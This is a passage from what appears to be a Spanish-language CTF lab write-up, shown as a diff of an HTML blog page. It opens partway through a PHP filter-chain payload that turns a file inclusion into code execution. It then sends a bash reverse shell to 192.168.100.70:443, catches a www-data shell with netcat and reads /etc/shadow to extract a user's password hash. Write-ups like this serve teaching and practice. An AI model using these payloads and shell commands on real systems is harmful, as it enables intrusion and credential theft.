conv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ademas del payload enviaremos en el parametro <code class="language-plaintext highlighter-rouge">cmd</code> una tipica reverse shell en bash urlencodeando <code class="language-plaintext highlighter-rouge">&</code> a <code class="language-plaintext highlighter-rouge">%26</code> para que no lo tome como otro argumento</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">&cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.100.70/443 0>%261'  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al enviar esto recibimos una shell como el usuario <code class="language-plaintext highlighter-rouge">www-data</code>, aunque para seguir nuevamente tendremos que leer el <code class="language-plaintext highlighter-rouge">hash</code> de jack para asi convertirnos en el</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.100.33 
+</span><span class="ve">www-data@jabita</span><span class="p">:</span><span class="az">~/html/building</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)  
+</span><span class="ve">www-data@jabita</span><span class="p">:</span><span class="az">~/html/building</span><span class="p">$ hostname -I
+192.168.100.33 
+</span><span class="ve">www-data@jabita</span><span class="p">:</span><span class="az">~/html/building</span><span class="p">$ grep '$6' /etc/shadow
+jack:</span><span class="ro">$6</span><span class="p">$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0:19236:0:99999:7:::  
+</span><span class="ve">www-data@jabita</span><span class="p">:</span><span class="az">~/html/building</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
